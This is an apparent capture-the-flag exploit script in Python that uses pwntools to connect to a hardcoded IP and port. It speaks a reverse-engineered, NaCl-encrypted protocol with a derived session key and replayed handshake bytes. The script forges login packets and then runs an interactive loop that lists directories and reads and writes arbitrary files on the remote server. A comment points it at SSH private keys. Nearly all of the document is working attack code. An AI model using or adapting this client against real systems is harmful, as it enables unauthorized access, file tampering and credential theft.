from nacl.secret import SecretBox
from nacl.public import Box, PrivateKey, PublicKey
from os import urandom
from pwn import *
from hashlib import sha256
import time
from base64 import b64encode
from nacl.exceptions import CryptoError

def fpToK(username, version, timestamp):
	return sha256(f"{username}+{version}+{timestamp}".encode()).digest()

host, port = "3.82.201.116", 6666
r = remote(host, port)
magic_start, magic_end = bytes.fromhex("17f4b888"), bytes.fromhex("efacc346")
uuid = bytes.fromhex("9aa9d3336f0ca4a86c3420e5af25f019") # 9aa9d333-6f0c-a4a8-6c34-20e5af25f019
username, version, timestamp = "ryder", "1.8.1.5", "1615896548"
session_key = fpToK(username, version, timestamp)
box = SecretBox(session_key)
good = bytes.fromhex("17f4b8885628000400000000efacc346")

def send(data):
	r.send(data)
	print(f"SENT: {data.hex()}")

def fingerprint(username, version, os, timestamp):
	username = b64encode(f"username={username}".encode())
	version = b64encode(f"version={version}-ZTW".encode())
	os = b64encode(f"os={os}".encode())
	timestamp = b64encode(f"timestamp={timestamp}".encode())
	return username+b","+version+b","+os+b","+timestamp

def lengthHeader(length):
	size1 = urandom(2)
	size2 = (length - int.from_bytes(size1, 'big')) + 0x10000
	return size1 + size2.to_bytes(2, 'big')

def crypt_negotiation(): # something is wrong here
	private = PrivateKey.generate()
	public = private.public_key
	server_public = bytes.fromhex("637b9cf51acc233db7b6b94ef0d51dd4f7f2f7db0f24703a9f5473ec8f7e6d50")
	init_box = Box(private, PublicKey(server_public))
	fp = fingerprint(username, version, "Ubuntu", timestamp)
	nonce = urandom(24)
	ciphertext = init_box.encrypt(fp, nonce) # pubkey + length header + nonce + ct
	ciphertext = lengthHeader(len(ciphertext)) + ciphertext
	print(bytes(public).hex())
	print(ciphertext.hex())
	# send(bytes(public))
	# send(ciphertext)

def login(ls):
	login_pt = magic_start + bytes.fromhex("56000002")
	if ls:
		login_pt += bytes.fromhex("0003")
	else:
		login_pt += bytes.fromhex("0002")
	login_pt += bytes.fromhex("56080010") + uuid + magic_end
	login_ct = box.encrypt(login_pt, urandom(24))
	login_ct = lengthHeader(len(login_ct)) + login_ct
	send(login_ct)
# send login with 03 instead of 02 after login

def recv():
	a = r.recv().strip()
	# if r.can_recv():
		# a += r.recv(4000).strip()
	nonce, ct = a[4:28], a[28:]
	try:
		res = box.decrypt(ct, nonce)
		if res == good:
			log.success("command successful")
			return
		if input("pt or hex? ").strip() == "pt":
			print(f"RECEIVED: {res}")
			return
		print(f"RECEIVED: {res.hex()}")
	except CryptoError:
		log.failure("decryption unsuccessful")

def list_dir():
	dirname = input("Where do you want to cd to? ").strip()
	length = len(dirname)+1
	dirname = dirname.encode() + b"\x00"
	pt = magic_start + bytes.fromhex("56000002000456080010") + uuid
	pt += bytes.fromhex("5614") + bytes.fromhex("{0:#0{1}x}".format(length,6)[2:]) + dirname + magic_end
	ct = box.encrypt(pt, urandom(24))
	ct = lengthHeader(len(ct)) + ct
	send(ct)

def get_file(): # read /home/lpuser/.ssh/id_rsa, /home/psuser/powershell_lp
	dirname = input("Where do you want to cd to? ").strip()
	filename = input("What file do you want to read? ").strip()
	dlen = len(dirname)+1
	flen = len(filename)+1
	dirname = dirname.encode() + b"\x00"
	filename = filename.encode() + b"\x00"
	pt = magic_start + bytes.fromhex("56000002000556080010") + uuid
	pt += bytes.fromhex("5614") + bytes.fromhex("{0:#0{1}x}".format(dlen,6)[2:]) + dirname
	pt += bytes.fromhex("561c") + bytes.fromhex("{0:#0{1}x}".format(flen,6)[2:]) + filename + magic_end
	ct = box.encrypt(pt, urandom(24))
	ct = lengthHeader(len(ct)) + ct
	send(ct)

def write_file():
	dirname = input("Where do you want to cd to? ").strip()
	filename = input("What file do you want to read? ").strip()
	contents = input("What do you want to write? ").strip()
	dlen = len(dirname)+1
	flen = len(filename)+1
	clen = len(contents)+1
	dirname = dirname.encode() + b"\x00"
	filename = filename.encode() + b"\x00"
	contents = contents.encode() + b"\x00"
	pt = magic_start + bytes.fromhex("56000002000656080010") + uuid
	pt += bytes.fromhex("5614") + bytes.fromhex("{0:#0{1}x}".format(dlen,6)[2:]) + dirname
	pt += bytes.fromhex("561c") + bytes.fromhex("{0:#0{1}x}".format(flen,6)[2:]) + filename
	pt += bytes.fromhex("5620") + bytes.fromhex("{0:#0{1}x}".format(clen,6)[2:]) + contents
	pt += bytes.fromhex("5624000100") + magic_end
	ct = box.encrypt(pt, urandom(24))
	ct = lengthHeader(len(ct)) + ct
	send(ct)

if __name__ == "__main__":
	send(bytes.fromhex("2482310504d18c604e48371ebe63cdb898f683ab758f73adccaf6d5b7ff27b32"))
	send(bytes.fromhex("15fbea88e640cbffbea8e6bbc37900d7022aae5736bf851ffcdea94d2bb09d57b2eea53d9648c1f9cae6d12c6f08609cee604700769f1efb14fd4705533e8e9232a8f10e404f54cdf2a3cf195a0152ffe2b10a8306adf9c2f9c66939aaa701aa63e1354194728ba2b97c4a8371a605b950afc4b7fb65931660b68406250170cbb1f8e7dac46477"))
	# # send(bytes.fromhex("70a98fa12b5b4a5b952a2547ac7392da0594ff8fc93d81b51d490f11c542a712ddb1c553fe2eb6a5f415b05a188e03f77136f63ed2f240c7dd23c58c08bffa65fa97d436fe3894d1764cdddde43a"))
	# recv()
	# crypt_negotiation()
	login(False)
	recv()
	# recv()
	# send(bytes.fromhex("4b90b4ba0051b97e82f5ff67c39facb1d035023e1bcc2615453ef28032cb16ede6aaeb1f9d6933acdb2e5b1efb7c484deabaf67e6d0d63f8e43ddf3897cce3f86d1ffc5b6233a713c3ce4e05aba4"))
	login(True) # get cwd
	recv()
	# send(bytes.fromhex("e56f1b1b68e79490fb9b40fd632686a4aac8087e4345c399c5375610316260edd0156f9229784c0b1095500fabf8ea454660a2618d920105d2b2ca17080ac1ab9d829f0749b70f6d8d918548e2460a3366fce3ae16561a0e135eb58b28d3074603e61e489361cf312bfe98708e6baa046dbc6cfd6110bddccf8da398b64afb0f8336452e446d731613532fea28fc"))
	# recv()
	while True:
		choice = input().strip()
		if choice == "read":
			get_file()
			recv()
		elif choice == "write":
			write_file()
			recv()
		elif choice == "pwd":
			login(True)
			recv()
		else:
			list_dir()
			recv()

# send crypt neg, login, login w/ 03, change dir to /tmp/endpoints, see if listing comes back